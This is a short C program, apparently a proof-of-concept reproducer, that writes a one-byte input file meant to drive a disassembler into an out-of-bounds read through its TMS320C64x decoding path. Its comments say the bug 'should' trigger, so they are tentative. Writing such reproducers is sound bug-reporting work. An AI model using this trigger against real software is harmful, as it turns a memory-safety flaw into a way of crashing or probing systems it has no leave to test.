#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Architecture selector: 0x1B selects TMS320C64x */
    fputc(0x1B, f);
    
    /* No instruction data - the disassembler will return immediately */
    /* with INVALID since there are no bytes to decode */
    /* This should trigger the INVALID path with public ID 0 */
    /* Then printInstruction() will be called with opcode 0 */
    /* The code at line 680 will access OpInfo[0] which should be 0 */
    /* This should trigger the out-of-bounds access */

    fclose(f);
    return 0;
}